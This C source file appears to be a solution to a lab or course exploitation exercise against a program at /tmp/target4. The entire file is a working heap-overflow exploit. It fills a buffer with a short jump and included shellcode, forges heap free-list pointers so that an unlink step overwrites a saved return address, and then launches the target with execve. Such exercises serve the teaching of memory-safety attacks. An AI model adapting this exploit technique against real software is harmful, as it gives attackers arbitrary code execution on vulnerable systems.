#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];

  int noop = 2048;
  char over[2048];
  int i;

  // Fill noop
  for (i=0; i<noop; i++) {
    over[i] = 'A';
  }

  // Skips straight to shellcode at 0x08059480
  over[0] = '\xeb';
  over[1] = '\x06';
  over[2] = '\x80';
  over[3] = '\x94';
  over[4] = '\x05';
  over[5] = '\x08';

  // Fill shellcode
  for (i=0; i<strlen(shellcode); i++) {
    over[i+8] = shellcode[i];
  }

  // Distance between new p and q is 1536 - 8 (for left and right) = 1528
  // Left pointer of q to new p
  over[1528] = '\x78';
  over[1529] = '\x94';
  over[1530] = '\x05';
  over[1531] = '\x08';

  // Right pointer of q to address of eip
  over[1532] = '\x7c';
  over[1533] = '\xf6';
  over[1534] = '\xff';
  over[1535] = '\xbf';  

  // Null character to stop
  over[2047] = '\x00';
  
  args[0] = TARGET; args[1] = over; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
